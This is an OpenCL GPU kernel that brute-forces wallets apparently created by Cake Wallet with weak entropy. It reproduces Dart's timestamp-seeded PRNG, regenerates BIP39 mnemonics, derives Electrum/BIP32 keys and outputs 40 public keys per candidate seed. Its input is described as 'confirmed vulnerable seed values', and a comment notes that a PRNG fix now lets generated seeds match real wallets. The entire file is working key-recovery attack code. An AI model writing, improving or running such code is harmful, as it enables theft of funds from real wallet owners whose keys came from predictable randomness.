// Cake Wallet Batch Address Derivation
// Input:  List of confirmed vulnerable seed values (Dart Random seeds = timestamp_us)
// Output: 40 compressed public keys (33 bytes each) per seed
// Path:   m/0'/{change}/{index},  change ∈ {0,1},  index ∈ 0..19

// ─── Dart PRNG helpers ──────────────────────────────────────────────────────
//
// FIXED: The previous version used an LCG:
//     state = state * 0x5DEECE66DUL + 0xB;
// That constant (0x5DEECE66D) is Java's java.util.Random multiplier — it has
// nothing to do with Dart. Dart's VM uses xorshift128+ initialized via two
// successive SplitMix64 steps. The incorrect PRNG produced entropy with a
// completely different distribution, so no Dart wallet seed could ever match.

// SplitMix64: used by Dart VM to derive xorshift128+ state from a user seed.
static ulong dart_splitmix64(ulong *sm) {
    *sm += 0x9e3779b97f4a7c15UL;
    ulong z = *sm;
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9UL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBUL;
    return z ^ (z >> 31);
}

// Initialize xorshift128+ state from a Dart Random(seed) seed value.
static void dart_prng_init(ulong seed, ulong *s0, ulong *s1) {
    ulong sm = seed;
    *s0 = dart_splitmix64(&sm);
    *s1 = dart_splitmix64(&sm);
    // Guard: xorshift128+ must not start in all-zero state
    if (*s0 == 0UL && *s1 == 0UL) {
        *s0 = 0x9e3779b97f4a7c15UL;
        *s1 = 0x6c62272e07bb0142UL;
    }
}

// One step of xorshift128+ and nextInt(256) — produces one entropy byte.
static uchar dart_next_byte(ulong *s0, ulong *s1) {
    ulong v0 = *s0;
    ulong v1 = *s1;
    ulong result = v0 + v1;           // output = pre-update sum

    ulong s1x = v1 ^ v0;
    *s0 = rotate(v0, 55UL) ^ s1x ^ (s1x << 14);
    *s1 = rotate(s1x, 36UL);

    // nextInt(256) via 128-bit multiply reduction (matches Dart VM)
    ulong x_hi = result >> 32;
    ulong x_lo = result & 0xFFFFFFFFUL;
    ulong res  = (x_hi * 256UL) + ((x_lo * 256UL) >> 32);
    return (uchar)(res >> 32);
}
// ────────────────────────────────────────────────────────────────────────────

__kernel void batch_cake_full(
    __global const ulong* input_seeds,    // Dart Random() seeds (timestamp_us values)
    __global uchar* output_pubkeys,       // 40 × 33 bytes per seed
    uint batch_size
) {
    uint gid = get_global_id(0);
    if (gid >= batch_size) return;

    // 1. Reconstruct Dart PRNG entropy from seed (FIXED)
    ulong s0, s1;
    dart_prng_init(input_seeds[gid], &s0, &s1);

    uchar entropy[16];
    for (int i = 0; i < 16; i++) {
        entropy[i] = dart_next_byte(&s0, &s1);
    }

    // 2. BIP39 checksum and word indices
    uchar entropy_hash[32] __attribute__((aligned(4)));
    sha256((__private const uint*)entropy, 16, (__private uint*)entropy_hash);
    uchar checksum = (entropy_hash[0] >> 4) & 0x0F; // top 4 bits for 128-bit entropy

    // Pack entropy into two ulongs (big-endian) for bit extraction
    ulong elo = 0UL, ehi = 0UL;
    for (int i = 0; i < 8; i++) ehi |= ((ulong)entropy[i])   << ((7 - i) * 8);
    for (int i = 0; i < 8; i++) elo |= ((ulong)entropy[i+8]) << ((7 - i) * 8);

    // Extract 12 × 11-bit word indices (132 bits total = 128 entropy + 4 checksum)
    ushort word_indices[12];
    word_indices[0]  = (ushort)((ehi >> 53) & 0x7FF);
    word_indices[1]  = (ushort)((ehi >> 42) & 0x7FF);
    word_indices[2]  = (ushort)((ehi >> 31) & 0x7FF);
    word_indices[3]  = (ushort)((ehi >> 20) & 0x7FF);
    word_indices[4]  = (ushort)((ehi >>  9) & 0x7FF);
    word_indices[5]  = (ushort)(((ehi & 0x1FFUL) << 2) | ((elo >> 62) & 0x3));
    word_indices[6]  = (ushort)((elo >> 51) & 0x7FF);
    word_indices[7]  = (ushort)((elo >> 40) & 0x7FF);
    word_indices[8]  = (ushort)((elo >> 29) & 0x7FF);
    word_indices[9]  = (ushort)((elo >> 18) & 0x7FF);
    word_indices[10] = (ushort)((elo >>  7) & 0x7FF);
    word_indices[11] = (ushort)(((elo & 0x7FUL) << 4) | checksum);

    // 3. Build mnemonic string
    uchar mnemonic[180] = {0};
    int mnemonic_len = 0;
    for (int i = 0; i < 12; i++) {
        int widx = word_indices[i];
        int wlen = word_lengths[widx];
        for (int j = 0; j < wlen; j++) {
            mnemonic[mnemonic_len++] = words[widx][j];
        }
        if (i < 11) mnemonic[mnemonic_len++] = ' ';
    }

    // 4. Electrum PBKDF2-HMAC-SHA512 (salt = "electrum", 2048 iterations)
    uchar ipad_key[128] __attribute__((aligned(4)));
    uchar opad_key[128] __attribute__((aligned(4)));
    for (int x = 0; x < 128; x++) {
        ipad_key[x] = (x < mnemonic_len) ? (mnemonic[x] ^ 0x36) : 0x36;
        opad_key[x] = (x < mnemonic_len) ? (mnemonic[x] ^ 0x5C) : 0x5C;
    }

    // "electrum" || \x00\x00\x00\x01
    uchar salt[12] = {101,108,101,99,116,114,117,109, 0,0,0,1};
    uchar sha512_result[64] __attribute__((aligned(8)));
    uchar buf[256] __attribute__((aligned(4)));

    // First PBKDF2 iteration — U1
    for (int x = 0; x < 128; x++) buf[x] = ipad_key[x];
    for (int x = 0; x < 12;  x++) buf[128+x] = salt[x];
    sha512((__private ulong*)buf, 140, (__private ulong*)sha512_result);

    for (int x = 0; x < 128; x++) buf[x] = opad_key[x];
    for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
    sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);

    uchar seed[64] __attribute__((aligned(8)));
    for (int x = 0; x < 64; x++) seed[x] = sha512_result[x];

    // Remaining 2047 iterations
    for (int iter = 1; iter < 2048; iter++) {
        for (int x = 0; x < 128; x++) buf[x] = ipad_key[x];
        for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
        sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);

        for (int x = 0; x < 128; x++) buf[x] = opad_key[x];
        for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
        sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);

        for (int x = 0; x < 64; x++) seed[x] ^= sha512_result[x];
    }

    // 5. BIP32 derivation: m/0'/{change}/{addr_idx}
    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);

    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, 0); // m/0'

    __global uchar *my_output = output_pubkeys + (gid * 40 * 33);

    for (uint change = 0; change <= 1; change++) {
        extended_private_key_t chain_key;
        normal_private_child_from_private(&account_key, &chain_key, change);

        for (uint addr_idx = 0; addr_idx < 20; addr_idx++) {
            extended_private_key_t address_key;
            normal_private_child_from_private(&chain_key, &address_key, addr_idx);

            extended_public_key_t address_pub;
            public_from_private(&address_key, &address_pub);

            uchar serialized[33];
            secp256k1_ec_pubkey_serialize(serialized, 33,
                &address_pub.public_key.key, SECP256K1_EC_COMPRESSED);

            int out_idx = (change * 20 + addr_idx) * 33;
            for (int k = 0; k < 33; k++) {
                my_output[out_idx + k] = serialized[k];
            }
        }
    }
}
